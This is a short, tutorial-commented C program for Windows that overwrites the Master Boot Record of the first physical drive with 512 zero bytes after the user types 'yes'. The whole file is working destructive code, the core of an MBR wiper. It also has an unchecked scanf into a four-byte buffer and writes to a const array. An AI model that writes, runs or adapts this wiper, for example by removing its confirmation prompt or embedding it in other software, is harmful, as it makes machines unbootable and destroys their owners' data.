#include <stdio.h>
#include <windows.h>

#define BUFF_SIZE 512 //size of our data will be 512 coz MBR has 512 bytes and we want to overwrite all of its bytes.

int main()
{
    char ans[4]; //our variable to store user input
    DWORD written; //Function WriteFile() (which we use later) returns written bytes to this variable
    printf("This program will overwrite your MBR! Do you want to run it? (yes/no): ");
    scanf("%s", ans);

    if(strcmp(ans, "yes") != 0) //if user input is not equal 'yes' program will exit
    {
        printf("Exiting...");
        Sleep(2000);
    }else if(strcmp(ans, "yes") == 0) //if answer is equal 'yes' program will try to overwrite MBR
    {
        HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); //HANDLE to MBR 
        //(read microsoft documentation to understang this function better)

        if(mbr == INVALID_HANDLE_VALUE) //if handle to MBR can't be opened program will exit
        {
            printf("Can't access MBR...Exiting...");
            Sleep(3000);
            ExitProcess(0);
        }

        const char trash_data[BUFF_SIZE]; // string (array of char's) in which we will store our data (bytes) to overwrite MBR
        ZeroMemory(trash_data, BUFF_SIZE); //this function fills our variable - trash_data with 0 (512 zeros)

        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our data worked (without errors) program will print
        {                                                                 //MBR overwritten and exit
            printf("MBR overwritten! :-)");
            Sleep(3000);
        }else //if our trial to overwrite MBR with our bytes did not work rogram will print Error and exit
        {
            printf("Error...Exiting...");
            Sleep(3000);
        }

        CloseHandle(mbr);//We' ve finished using our handle so we should close it
    }
    return 0;
}
